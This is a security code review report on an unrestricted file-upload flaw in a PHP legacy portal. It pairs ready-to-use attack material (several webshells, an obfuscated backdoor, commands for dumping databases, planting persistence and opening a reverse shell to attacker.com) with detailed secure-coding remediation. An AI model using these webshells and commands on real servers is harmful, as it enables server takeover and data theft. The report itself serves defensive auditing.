# Security Code Review Report

## Target Information
- **Domain**: old.example.com
- **Review Date**: 2024-09-20
- **Reviewer**: Security Team
- **Repository**: https://github.com/example/legacy-portal
- **Commit Hash**: 8a2f9b3e1d7c4a6f5b8e2d9a3c7f1e4b8d6a9c2f

---

## Executive Summary

This report identifies a critical Remote Code Execution (RCE) vulnerability in the file upload functionality of old.example.com. The legacy application allows unrestricted file uploads without proper validation, enabling attackers to upload and execute malicious PHP scripts on the server.

---

## Vulnerability Details

### 1. Unrestricted File Upload Leading to RCE

**Severity**: CRITICAL
**CWE**: CWE-434 (Unrestricted Upload of File with Dangerous Type)
**CVSS Score**: 9.9
**File**: `upload/process_upload.php:45`
**Git Commit**: 8a2f9b3e1d7c4a6f5b8e2d9a3c7f1e4b8d6a9c2f

#### Description
The file upload handler only checks file extensions using client-side validation and performs a weak server-side check that can be easily bypassed. Uploaded files are stored in a web-accessible directory with execute permissions, allowing direct execution of uploaded PHP scripts.

#### Vulnerable Code
```php
<?php
// process_upload.php

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        $filename = $file['name'];

        // VULNERABLE: Weak extension check only
        $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

        $allowed = array('jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx');

        // VULNERABLE: Can be bypassed with double extensions
        if (in_array($extension, $allowed)) {
            $upload_path = 'uploads/' . $filename;

            // VULNERABLE: No content validation
            if (move_uploaded_file($file['tmp_name'], $upload_path)) {
                echo json_encode(['success' => true, 'path' => $upload_path]);
            } else {
                echo json_encode(['success' => false, 'error' => 'Upload failed']);
            }
        } else {
            echo json_encode(['success' => false, 'error' => 'Invalid file type']);
        }
    }
}
?>
```

#### Proof of Concept

**Method 1: Double Extension Bypass**
```bash
# Create a malicious PHP webshell
cat > shell.php.jpg << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF

# Upload the file
curl -X POST https://old.example.com/upload/process_upload.php \
  -F "file=@shell.php.jpg"

# Access the webshell (if server processes .php.jpg as PHP)
curl "https://old.example.com/uploads/shell.php.jpg?cmd=id"
```

**Method 2: Null Byte Injection (older PHP versions)**
```bash
# Create webshell with null byte
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Upload with null byte (file will be saved as shell.php)
curl -X POST https://old.example.com/upload/process_upload.php \
  -F "file=@shell.php;filename=shell.php%00.jpg"

# Execute commands
curl "https://old.example.com/uploads/shell.php?cmd=whoami"
```

**Method 3: Content-Type Manipulation**
```bash
# Upload PHP file disguised as image
cat > backdoor.php << 'EOF'
GIF89a
<?php
if(isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}
?>
EOF

mv backdoor.php backdoor.gif

curl -X POST https://old.example.com/upload/process_upload.php \
  -F "file=@backdoor.gif"

# Execute via POST
curl -X POST "https://old.example.com/uploads/backdoor.gif" \
  -d "cmd=cat /etc/passwd"
```

**Advanced Webshell Example:**
```php
<?php
// Obfuscated webshell
@error_reporting(0);
@ini_set('display_errors', 0);

$a = $_GET['a'] ?? $_POST['a'] ?? 'info';
$p = $_GET['p'] ?? $_POST['p'] ?? '';

switch($a) {
    case 'cmd':
        echo shell_exec($p);
        break;
    case 'eval':
        eval($p);
        break;
    case 'download':
        echo file_get_contents($p);
        break;
    case 'upload':
        file_put_contents($p, file_get_contents($_FILES['f']['tmp_name']));
        break;
    case 'info':
        phpinfo();
        break;
}
?>
```

#### Impact
- **Complete Server Compromise**: Full control over web server
- **Data Exfiltration**: Access to database credentials, configuration files
- **Lateral Movement**: Use server as pivot point to attack internal network
- **Malware Distribution**: Host phishing pages or malware
- **Cryptomining**: Install cryptocurrency miners
- **Database Compromise**: Access to all application data
- **Ransomware Deployment**: Encrypt server files

#### Post-Exploitation Commands
```bash
# After uploading webshell, attacker can:

# 1. Enumerate system
curl "https://old.example.com/uploads/shell.gif?cmd=uname -a"
curl "https://old.example.com/uploads/shell.gif?cmd=cat /etc/passwd"

# 2. Find database credentials
curl "https://old.example.com/uploads/shell.gif?cmd=cat ../config/database.php"

# 3. Download entire database
curl "https://old.example.com/uploads/shell.gif?cmd=mysqldump -u root -p'password' --all-databases" > dump.sql

# 4. Create persistent backdoor
curl "https://old.example.com/uploads/shell.gif" \
  -d "cmd=echo '<?php system(\$_GET[0]); ?>' > ../index.php"

# 5. Establish reverse shell
curl "https://old.example.com/uploads/shell.gif" \
  -d "cmd=bash -i >& /dev/tcp/attacker.com/4444 0>&1"
```

#### Remediation

**Comprehensive Secure Upload Implementation:**

```php
<?php
// secure_upload.php

session_start();

// 1. Verify CSRF token
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die(json_encode(['success' => false, 'error' => 'Invalid request']));
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];

    // 2. Check file size (5MB max)
    $max_size = 5 * 1024 * 1024;
    if ($file['size'] > $max_size) {
        die(json_encode(['success' => false, 'error' => 'File too large']));
    }

    // 3. Validate MIME type using fileinfo
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime_type = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);

    $allowed_mimes = [
        'image/jpeg' => 'jpg',
        'image/png' => 'png',
        'image/gif' => 'gif',
        'application/pdf' => 'pdf'
    ];

    if (!isset($allowed_mimes[$mime_type])) {
        die(json_encode(['success' => false, 'error' => 'Invalid file type']));
    }

    // 4. Generate secure random filename
    $extension = $allowed_mimes[$mime_type];
    $new_filename = bin2hex(random_bytes(16)) . '.' . $extension;

    // 5. Store outside web root with restrictive permissions
    $upload_dir = '/var/www/data/uploads/';
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0750, true);
    }

    $upload_path = $upload_dir . $new_filename;

    // 6. Move file with safe permissions
    if (move_uploaded_file($file['tmp_name'], $upload_path)) {
        chmod($upload_path, 0640); // No execute permission

        // 7. Additional validation for images
        if (strpos($mime_type, 'image/') === 0) {
            $img = @getimagesize($upload_path);
            if ($img === false) {
                unlink($upload_path);
                die(json_encode(['success' => false, 'error' => 'Invalid image']));
            }

            // Re-encode image to strip metadata and embedded code
            switch($mime_type) {
                case 'image/jpeg':
                    $image = imagecreatefromjpeg($upload_path);
                    imagejpeg($image, $upload_path, 90);
                    break;
                case 'image/png':
                    $image = imagecreatefrompng($upload_path);
                    imagepng($image, $upload_path);
                    break;
                case 'image/gif':
                    $image = imagecreatefromgif($upload_path);
                    imagegif($image, $upload_path);
                    break;
            }
            imagedestroy($image);
        }

        // 8. Store metadata in database
        $stmt = $pdo->prepare(
            "INSERT INTO uploads (filename, original_name, mime_type, size, user_id)
             VALUES (?, ?, ?, ?, ?)"
        );
        $stmt->execute([
            $new_filename,
            basename($file['name']),
            $mime_type,
            $file['size'],
            $_SESSION['user_id']
        ]);

        $file_id = $pdo->lastInsertId();

        echo json_encode([
            'success' => true,
            'file_id' => $file_id,
            'filename' => $new_filename
        ]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Upload failed']);
    }
}
?>
```

**Serve Files Through Download Script:**
```php
<?php
// download.php - Serve files without execute permission

session_start();

$file_id = $_GET['id'] ?? null;

if (!$file_id) {
    http_response_code(400);
    die('Invalid request');
}

// Fetch file metadata from database
$stmt = $pdo->prepare("SELECT * FROM uploads WHERE id = ? AND user_id = ?");
$stmt->execute([$file_id, $_SESSION['user_id']]);
$file = $stmt->fetch();

if (!$file) {
    http_response_code(404);
    die('File not found');
}

$filepath = '/var/www/data/uploads/' . $file['filename'];

if (!file_exists($filepath)) {
    http_response_code(404);
    die('File not found');
}

// Serve file with proper headers
header('Content-Type: ' . $file['mime_type']);
header('Content-Disposition: attachment; filename="' . $file['original_name'] . '"');
header('Content-Length: ' . filesize($filepath));
readfile($filepath);
?>
```

---

## Additional Findings

### 2. Directory Listing Enabled

**Severity**: MEDIUM
**File**: Apache configuration

The uploads directory has directory listing enabled, allowing enumeration of all uploaded files.

**Remediation**: Add to .htaccess in uploads directory:
```apache
Options -Indexes
```

### 3. No Rate Limiting

**Severity**: MEDIUM

Upload endpoint lacks rate limiting, allowing automated upload attacks.

**Remediation**: Implement rate limiting using fail2ban or application-level throttling.

---

## Recommendations

1. **Immediate Actions** (CRITICAL - within 4 hours):
   - Take upload functionality offline immediately
   - Scan uploads directory for PHP files: `find uploads/ -name "*.php*" -o -name "*.phtml"`
   - Review web server access logs for suspicious uploads
   - Check for unauthorized access or data exfiltration
   - Disable PHP execution in uploads directory via .htaccess
   - Quarantine suspicious files

2. **Short-term Actions** (within 48 hours):
   - Implement secure file upload handler
   - Move uploads directory outside web root
   - Deploy Web Application Firewall (WAF)
   - Implement malware scanning on uploads
   - Add CSRF protection to all forms

3. **Long-term Improvements**:
   - Migrate legacy application to modern framework
   - Implement comprehensive security testing
   - Regular security audits and penetration testing
   - Deploy intrusion detection system (IDS)
   - Implement file integrity monitoring

---

## Apache Configuration to Block PHP Execution

Add to uploads directory .htaccess:
```apache
# Disable PHP execution
<FilesMatch "\\.php$">
    SetHandler none
    SetHandler default-handler
    Options -ExecCGI
    RemoveHandler .php .phtml .php3 .php4 .php5 .phps
    RemoveType .php .phtml .php3 .php4 .php5 .phps
</FilesMatch>

# Disable directory listing
Options -Indexes

# Only allow specific file types
<FilesMatch "\\.(jpg|jpeg|png|gif|pdf)$">
    Order Allow,Deny
    Allow from all
</FilesMatch>

# Deny access to everything else
<FilesMatch ".">
    Order Allow,Deny
    Deny from all
</FilesMatch>
```

---

## Timeline
- **Discovery**: 2024-09-18
- **Verification**: 2024-09-19
- **Report Delivered**: 2024-09-20
- **Expected Fix**: IMMEDIATE (Critical Priority)

---

## References
- OWASP File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- CWE-434: https://cwe.mitre.org/data/definitions/434.html
- PHP File Upload Security: https://www.php.net/manual/en/features.file-upload.php
